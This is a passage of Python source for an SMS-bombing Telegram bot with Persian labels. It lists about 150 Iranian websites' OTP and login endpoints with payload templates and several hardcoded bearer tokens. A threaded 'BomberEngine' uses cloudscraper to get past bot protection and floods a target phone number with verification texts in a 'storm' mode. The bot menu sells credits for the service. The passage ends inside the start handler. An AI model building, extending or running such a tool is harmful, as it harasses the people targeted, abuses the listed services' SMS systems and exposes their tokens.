    {"name": "Hiword", "url": "https://hiword.ir/wp-json/otp-login/v1/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"identifier": "0{phone}"}, "type": "json"},
    {"name": "Tnovin", "url": "http://shop.tnovin.com/login", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"phone": "0{phone}"}, "type": "form"},
    {"name": "Exo", "url": "https://exo.ir/index.php?route=account/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_number": "0{phone}"}, "type": "json"},
    {"name": "Shahrefarsh", "url": "https://shahrfarsh.com/Account/Login", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"phoneNumber": "0{phone}"}, "type": "form"},
    {"name": "Tikban", "url": "https://tikban.com/Account/LoginAndRegister", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"cellPhone": "0{phone}"}, "type": "json"},
    {"name": "Dicardo", "url": "https://dicardo.com/main/sendsms", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
    {"name": "Farsgraphic", "url": "https://farsgraphic.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"action": "digits_check_mob", "countrycode": "+98", "mobileNo": "{phone}", "login": "2", "json": "1", "whatsapp": "0"}, "type": "form"},
    {"name": "Steelalborz", "url": "https://steelalborz.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"action": "digits_check_mob", "countrycode": "+98", "mobileNo": "0{phone}", "login": "2", "json": "1", "whatsapp": "0"}, "type": "form"},
    {"name": "Offdecor", "url": "https://www.offdecor.com/index.php?route=account/login/sendCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
    {"name": "Tagmond", "url": "https://tagmond.com/phone_number", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, "payload": {"utf8": "✓", "phone_number": "0{phone}", "g-recaptcha-response": ""}, "type": "form"},
    {"name": "Zoodex", "url": "https://admin.zoodex.ir/api/v1/login/check", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Ayantech", "url": "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"Parametrs": {"ApplicationType": "Web", "ApplicationUniqueToken": None, "ApplicationVersion": "1.0.0", "MobileNumber": "0{phone}"}}, "type": "json"},
    {"name": "Dadhesab", "url": "https://api.dadhesab.ir/user/entry", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
    {"name": "Homtick", "url": "https://auth.homtick.com/api/V1/User/GetVerifyCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobileOrEmail": "0{phone}", "deviceCode": "d520c7a8-421b-4563-b955-f5abc56b97ec", "firstName": "", "lastName": "", "password": ""}, "type": "json"},
    {"name": "Iranamlaak", "url": "https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"AgencyMobile": "0{phone}"}, "type": "json"},
    {"name": "Karchidari", "url": "https://api.kcd.app/api/v1/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Rayshomar", "url": "https://api.rayshomar.ir/api/Register/RegistrMobile", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "payload": {"MobileNumber": "0{phone}"}, "type": "form"},
    {"name": "Uphone", "url": "https://server.uphone.ir/api/v1/login/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Novinbook", "url": "https://novinbook.com/index.php?route=account/phone", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"phone": "0{phone}"}, "type": "form"},
    {"name": "Offch", "url": "https://api.offch.com/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
    {"name": "Glite", "url": "https://www.glite.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"action": "logini_first", "login": "0{phone}"}, "type": "form"},
    {"name": "Sabziman", "url": "https://sabziman.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"action": "newphoneexist", "phonenumber": "0{phone}"}, "type": "form"},
    {"name": "Tajtehran", "url": "https://tajtehran.com/RegisterRequest", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"mobile": "0{phone}", "password": "mamad1234"}, "type": "form"},
    {"name": "Watchonline", "url": "https://api.watchonline.shop/api/v1/otp/request", "method": "POST", "headers": {"Content-Type": "application/json", "Authorization": "Bearer 7e3b55d76312e3c127758e1a5d47d27d49ea22ebf7d9ba99cb9ff3516d34900b"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Gharar", "url": "https://gharar.ir/users/phone_number/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"phone": "0{phone}"}, "type": "form"},
    {"name": "Janebi", "url": "https://janebi.com/signin?do", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"resend": "0{phone}"}, "type": "json"},
    {"name": "Komodaa", "url": "https://api.komodaa.com/api/v2.6/loginRC/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone_number": "0{phone}"}, "type": "json"},
    {"name": "Noavarpub", "url": "https://noavarpub.com/logins/login.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}", "submit": "123"}, "type": "json"},
    {"name": "Cheshmandazketab", "url": "https://www.cheshmandazketab.ir/Register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}", "login": "1"}, "type": "json"},
    {"name": "Nalinoco", "url": "https://www.nalinoco.com/api/customers/login-register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "ReturnUrl": "/", "step": "1"}, "type": "json"},
    {"name": "Harikashop", "url": "https://harikashop.com/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}", "action": "register", "ajax": "1"}, "type": "json"},
    {"name": "Novinparse", "url": "https://novinparse.com/Page/PageAction.aspx", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"Action": "SendVerifyCode", "repeatFlag": "true", "mobile": "0{phone}"}, "type": "json"},
    {"name": "Sunnybook", "url": "https://sunnybook.ir/Home/RegisterUser", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"name": "Mr", "password": "123456", "mobile": "{phone}"}, "type": "json"},
    {"name": "Adinehbook", "url": "https://www.adinehbook.com/gp/flex/sign-in.html", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "sign", "phone_cell_or_email": "0{phone}"}, "type": "json"},
    {"name": "Parkbag", "url": "https://parkbag.com/fa/Account/RegisterOrLoginByMobileNumber", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"ReturnUrl": "https://parkbag.com/", "MobaileNumber": "{phone}"}, "type": "json"},
    {"name": "Mahouney", "url": "https://mahouney.com/fa/Account/RegisterOrLoginByMobileNumber", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"ReturnUrl": "https://mahouney.com/", "MobaileNumber": "0{phone}"}, "type": "json"},
    {"name": "Shimashoes", "url": "https://shimashoes.com/api/customer/member/register/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"email": "0{phone}"}, "type": "json"},
    {"name": "Queenaccessories", "url": "https://queenaccessories.ir/api/v1/sessions/login_request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_phone": "0{phone}"}, "type": "json"},
    {"name": "Vinaaccessory", "url": "https://vinaaccessory.com/api/v1/sessions/login_request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_phone": "0{phone}"}, "type": "json"},
    {"name": "Rastaraccessory", "url": "https://rastaraccessory.ir/api/v1/sessions/login_request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_phone": "0{phone}"}, "type": "json"},
    {"name": "Bartarinha", "url": "https://bartarinha.com/Advertisement/Users/RequestLoginMobile", "method": "POST", "headers": {"Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest"}, "payload": {"mobileNo": "0{phone}"}, "type": "json"},
    {"name": "Manoshahr", "url": "https://manoshahr.ir/jq.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}", "class_name": "public_login", "function_name": "sendCode"}, "type": "json"},
    {"name": "80w", "url": "https://80w.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"login": "0{phone}", "action": "logini_first"}, "type": "json"},
    {"name": "Hovalvakil", "url": "https://api.hovalvakil.com/api/User/SendConfirmCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"userName": "{phone}"}, "type": "json"},
    {"name": "Digighate", "url": "https://api.digighate.com/v2/public/code", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "{phone}"}, "type": "json"},
    {"name": "Azarbadbook", "url": "https://azarbadbook.ir/ajax/login_j_ajax_ver/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "{phone}"}, "type": "json"},
    {"name": "Kanoonbook", "url": "https://www.kanoonbook.ir/store/customer_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"customer_username": "{phone}", "task": "customer_phone"}, "type": "json"},
    {"name": "Ketabir", "url": "https://sso-service.ketab.ir/api/v2/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"Mobile": "0{phone}", "OtpSmsType": "1"}, "type": "json"},
    {"name": "Snappshop", "url": "https://apix.snappshop.co/auth/v1/pre-login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Ketabium", "url": "https://www.ketabium.com/login-register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
    {"name": "Rirabook", "url": "https://rirabook.com/loginAth", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile1": "0{phone}", "loginbt1": ""}, "type": "json"},
    {"name": "Pashikshoes", "url": "https://api.pashikshoes.com/v1/customer/register-login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Tamimpishro", "url": "https://www.tamimpishro.com/site/api/v1/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Fafait", "url": "https://api2.fafait.net/oauth/check-user", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"id": "0{phone}"}, "type": "json"},
    {"name": "Fankala", "url": "https://fankala.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "verify_user_login", "user": "0{phone}", "captcha": ""}, "type": "json"},
    {"name": "Arastag", "url": "https://arastag.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "verify_user_login", "user": "0{phone}", "captcha": ""}, "type": "json"},
    {"name": "Mellishoes", "url": "https://mellishoes.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "websima_auth_account_detection", "mobile": "0{phone}"}, "type": "json"},
    {"name": "Setshoe", "url": "https://setshoe.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "stm_login_register", "type": "mobile", "input": "0{phone}"}, "type": "json"},
    {"name": "Telketab", "url": "https://telketab.com/opt_field/check_secret", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"identity": "0{phone}", "plugin": "otp_field_sms_processor"}, "type": "json"},
    {"name": "Gitamehr", "url": "https://gitamehr.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "stm_login_register", "type": "mobile", "input": "0{phone}"}, "type": "json"},
    {"name": "Meidane", "url": "https://meidane.com/accounts/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"name": "Mr", "password": "123456", "mobile": "{phone}"}, "type": "json"},
    {"name": "Myroz", "url": "https://myroz.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "stm_login_register", "type": "mobile", "input": "0{phone}"}, "type": "json"},
    {"name": "Elecmarket", "url": "https://elecmarket.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "stm_login_register", "type": "mobile", "input": "0{phone}"}, "type": "json"},
    {"name": "Techsiro", "url": "https://techsiro.com/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"client": "web", "method": "POST", "mobile": "0{phone}"}, "type": "json"},
    {"name": "Account724", "url": "https://account724.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "stm_login_register", "type": "mobile", "input": "0{phone}"}, "type": "json"},
    {"name": "Eaccount", "url": "https://eaccount.ir/api/v1/sessions/login_request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_phone": "0{phone}"}, "type": "json"},
    {"name": "Chortkehshop", "url": "https://chortkehshop.ir/api/v1/sessions/login_request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_phone": "0{phone}"}, "type": "json"},
    {"name": "Piinkstore", "url": "https://piinkstore.ir/api/v1/sessions/login_request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_phone": "0{phone}"}, "type": "json"},
    {"name": "Dreamlandshop", "url": "https://dreamlandshop.ir/api/v1/sessions/login_request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_phone": "0{phone}"}, "type": "json"},
    {"name": "Novinmedical", "url": "https://novinmedical.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"action": "stm_login_register", "type": "mobile", "input": "0{phone}"}, "type": "json"},
    {"name": "Taaghche", "url": "https://gw.taaghche.com/v4/site/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"contact": "0{phone}", "forceOtp": False}, "type": "json"},
    {"name": "Fidibo", "url": "https://fidibo.com/user/login-by-sms", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "payload": {"mobile_number": "{phone}", "country_code": "ir"}, "type": "form"},
    {"name": "Ketabchi", "url": "https://ketabchi.com/api/v1/auth/requestVerificationCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phoneNumber": "0{phone}"}, "type": "json"},
    {"name": "Virgool", "url": "https://virgool.io/api/v1.4/auth/verify", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"method": "phone", "identifier": "0{phone}"}, "type": "json"},
    {"name": "Timcheh", "url": "https://api.timcheh.com/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Football360", "url": "https://football360.ir/api/auth/verify-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone_number": "+98{phone}"}, "type": "json"},
    {"name": "Pinorest", "url": "https://api.pinorest.com/frontend/auth/login/mobile", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "{phone}"}, "type": "json"},
    {"name": "Ghasedak24", "url": "https://ghasedak24.com/user/ajax_register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
    {"name": "Iranketab", "url": "https://www.iranketab.ir/account/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"UserName": "0{phone}"}, "type": "json"},
    {"name": "Takfarsh", "url": "https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone_email": "0{phone}"}, "type": "json"},
    {"name": "Dadpardaz", "url": "https://dadpardaz.com/advice/getLoginConfirmationCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Iranicard", "url": "https://api.iranicard.ir/api/v1/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Tj8", "url": "https://tj8.ir/auth/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Mashinbank", "url": "https://mashinbank.com/api2/users/check", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobileNumber": "0{phone}"}, "type": "json"},
    {"name": "Cinematicket", "url": "https://cinematicket.org/api/v1/users/signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone_number": "0{phone}"}, "type": "json"},
    {"name": "Kafegheymat", "url": "https://kafegheymat.com/shop/getLoginSms", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
    {"name": "Opco", "url": "https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"telephone": "0{phone}"}, "type": "json"},
    {"name": "Melix", "url": "https://melix.shop/site/api/v1/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Safiran", "url": "https://safiran.shop/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Pirankalaco", "url": "https://pirankalaco.ir/shop/SendPhone.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"phone": "0{phone}"}, "type": "form"},
    {"name": "Dastakht", "url": "https://dastkhat-isad.ir/api/v1/user/store", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "{phone}", "countryCode": 98, "device_os": 2}, "type": "json"},
    {"name": "Hamlex", "url": "https://hamlex.ir/register.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "payload": {"fullname": "ممد", "phoneNumber": "0{phone}", "register": ""}, "type": "form"},
    {"name": "Irwco", "url": "https://irwco.ir/register", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"mobile": "0{phone}"}, "type": "form"},
    {"name": "Sibbank", "url": "https://api.sibbank.ir/v1/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone_number": "0{phone}"}, "type": "json"},
    {"name": "Arshian", "url": "https://api.arshiyan.com/send_code", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"country_code": "98", "phone_number": "{phone}"}, "type": "json"},
    {"name": "Topnoor", "url": "https://backend.topnoor.ir/web/v1/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Alinance", "url": "https://api.alinance.com/user/register/mobile/send/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone_number": "0{phone}"}, "type": "json"},
    {"name": "Chaymarket", "url": "https://www.chaymarket.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"action": "digits_check_mob", "countrycode": "+98", "mobileNo": "0{phone}", "login": "2", "json": "1", "whatsapp": "0"}, "type": "form"},
    {"name": "Coffefastfoodluxury", "url": "https://coffefastfoodluxury.ir/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"action": "digits_check_mob", "countrycode": "+98", "mobileNo": "0{phone}", "login": "2", "json": "1", "whatsapp": "0"}, "type": "form"},
    {"name": "Dosma", "url": "https://app.dosma.ir/sendverify/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
    {"name": "Ehteraman", "url": "https://api.ehteraman.com/api/request/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Mcishop", "url": "https://api-ebcom.mci.ir/services/auth/v1.0/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"msisdn": "{phone}"}, "type": "json"},
    {"name": "Abantether", "url": "https://abantether.com/users/register/phone/send/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phoneNumber": "0{phone}"}, "type": "json"},
    {"name": "Flightio", "url": "https://flightio.com/bff/Authentication/CheckUserKey", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"userKey": "0{phone}"}, "type": "json"},
    {"name": "Chamedon", "url": "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Shab", "url": "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Farvi", "url": "https://farvi.shop/api/v1/sessions/login_request", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_phone": "0{phone}"}, "type": "json"},
    {"name": "A4baz", "url": "https://a4baz.com/api/web/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"cellphone": "0{phone}"}, "type": "json"},
    {"name": "Hyperjan", "url": "https://shop.hyperjan.ir/api/users/manage", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Banankala", "url": "https://banankala.com/home/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"Mobile": "0{phone}"}, "type": "json"},
    {"name": "Rokla", "url": "https://api.rokla.ir/api/request/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Safarmarket", "url": "https://safarmarket.com//api/security/v2/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
    {"name": "Emtiaz", "url": "https://web.emtiyaz.app/json/login", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "payload": {"send": "1", "cellphone": "0{phone}"}, "type": "form"},
    {"name": "Azinja", "url": "https://arzinja.app/api/login", "method": "POST", "headers": {"Content-Type": "multipart/form-data"}, "payload": {"mobile": "0{phone}"}, "type": "form"},
    {"name": "Digify", "url": "https://apollo.digify.shop/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"operationName": "Mutation", "variables": {"content": {"phone_number": "0{phone}"}}, "query": "mutation Mutation($content: MerchantRegisterOTPSendContent) { merchantRegister { otpSend(content: $content) __typename } }"}, "type": "json"},
    {"name": "Chartex", "url": "https://api.chartex.net/api/v2/user/validate", "method": "POST", "headers": {"Content-Type": "application/json", "provider-code": "RUBIKA", "Authorization": "JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTgwMzU0NDEsImlhdCI6MTU5Nzg2MjY0MSwibmJmIjoxNTk3ODYyNjQxLCJhZCI6MTA2NDIxLCJpZCI6MTA2NDIyLCJyb2xlIjoiR1VFU1QiLCJzZXNzaW9uX2tleSI6ImxvZ2luX3Nlc3Npb25fMTA2NDIxXzEwNjQyMl9JQXdqUkZrTVBMUWhJeG5oSGFlQXdqVHciLCJwYyI6bnVsbCwiYyI6IklSUiJ9.wMAa_fI7VVBal8IhBeM-6wmGK4bDUOEj2fjoKhknyRk"}, "payload": {"mobile": "0{phone}", "country_code": "IR", "provider_code": "RUBIKA"}, "type": "json"},
    {"name": "Wisgoon", "url": "https://gateway.wisgoon.com/api/v1/auth/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}", "recaptcha-response": "", "token": "e622c330c77a17c8426e638d7a85da6c2ec9f455"}, "type": "json"},
    {"name": "Behzadshami", "url": "https://behzadshami.com/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "payload": {"action": "digits_check_mob", "countrycode": "+98", "mobileNo": "{phone}", "login": "2", "json": "1", "whatsapp": "0"}, "type": "form"},
    {"name": "Pubgsell", "url": "https://pubg-sell.ir/loginuser", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, "payload": {"username": "0{phone}"}, "type": "json"},
    {"name": "Pindo", "url": "https://api.pindo.ir/v1/user/login-register/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
    {"name": "Pateh", "url": "https://api.pateh.com/api/v1/LoginOrRegister", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Reyanertebat", "url": "https://pay.rayanertebat.ir/api/User/Otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobileNo": "0{phone}"}, "type": "json"},
    {"name": "Iranlms", "url": "https://messengerg2c4.iranlms.ir/", "method": "POST", "headers": {"Content-Type": "text/plain"}, "payload": {"se": "0{phone}"}, "type": "json"},
    {"name": "Ostadkar", "url": "https://api.ostadkr.com/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
    {"name": "Sibirani", "url": "https://sandbox.sibirani.ir/api/v1/user/invite", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json"},
    {"name": "Miare", "url": "https://www.miare.ir/api/otp/driver/request/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone_number": "0{phone}"}, "type": "json"}
]

# ============================================================
# موتور ارسال
# ============================================================

class BomberEngine:
    def __init__(self):
        self.scraper = cloudscraper.create_scraper(browser={'browser': 'chrome'})
        self.is_running = False
        self.results = []
    
    def _replace_phone(self, obj, phone):
        if isinstance(obj, str):
            return obj.replace("{phone}", phone)
        elif isinstance(obj, dict):
            return {k: self._replace_phone(v, phone) for k, v in obj.items()}
        elif isinstance(obj, list):
            return [self._replace_phone(i, phone) for i in obj]
        return obj
    
    def attack_site(self, site, phone, test_type):
        result = {
            'name': site.get('name', 'Unknown'),
            'status': 'unknown',
            'status_code': None,
            'message': None,
            'error': None
        }
        
        try:
            headers = site.get('headers', {}).copy()
            test_phone = "0" + phone if test_type == "with_zero" else phone
            payload = self._replace_phone(site.get('payload', {}), test_phone)
            url = site['url'].replace("{phone}", test_phone)
            
            if site.get('method') == 'GET':
                response = self.scraper.get(url, params=payload, headers=headers, timeout=10)
            else:
                if site.get('type') == 'form':
                    response = self.scraper.post(url, data=payload, headers=headers, timeout=10)
                else:
                    response = self.scraper.post(url, json=payload, headers=headers, timeout=10)
            
            result['status_code'] = response.status_code
            result['status'] = 'success' if response.status_code < 400 else 'failed'
            result['message'] = f"Response: {response.text[:50]}"
            
        except Exception as e:
            result['status'] = 'error'
            result['error'] = str(e)
        
        return result
    
    def run_bomb(self, endpoints, phone, mode="storm", on_complete=None):
        self.is_running = True
        self.results = []
        
        types = ["without_zero", "with_zero"]
        
        for t in types:
            if not self.is_running:
                break
            
            if mode == "storm":
                with ThreadPoolExecutor(max_workers=20) as executor:
                    futures = [executor.submit(self.attack_site, site, phone, t) for site in endpoints]
                    for future in as_completed(futures):
                        if not self.is_running:
                            break
                        self.results.append(future.result())
            else:
                for site in endpoints:
                    if not self.is_running:
                        break
                    self.results.append(self.attack_site(site, phone, t))
                    time.sleep(0.2)
        
        self.is_running = False
        success = [r for r in self.results if r['status'] == 'success']
        
        result = {
            'total': len(self.results),
            'success': len(success),
            'failed': len([r for r in self.results if r['status'] == 'failed']),
            'errors': len([r for r in self.results if r['status'] == 'error']),
            'results': self.results
        }
        
        if on_complete:
            on_complete(result)
        return result
    
    def stop(self):
        self.is_running = False

bomber = BomberEngine()

# ============================================================
# کیبوردها
# ============================================================

async def main_keyboard(user_id):
    keyboard = [
        [InlineKeyboardButton(text="📱 SMS Bomber", callback_data="sms_bomb")],
        [InlineKeyboardButton(text="👤 پروفایل", callback_data="profile")],
        [InlineKeyboardButton(text="🔗 سیستم معرفی", callback_data="referral")],
        [InlineKeyboardButton(text="💰 خرید اعتبار", callback_data="buy_credits")],
        [InlineKeyboardButton(text="📊 آمار", callback_data="stats")]
    ]
    
    if user_id in ADMIN_IDS:
        keyboard.append([InlineKeyboardButton(text="⚙️ پنل مدیریت", callback_data="admin_panel")])
    
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

# ============================================================
# هندلرها (همون کدهای قبلی)
# ============================================================

@dp.message(CommandStart())
async def cmd_start(message: Message):
    user_id = message.from_user.id
    first_name = message.from_user.first_name
    username = message.from_user.username
    
    args = message.text.split()
    referred_by = None
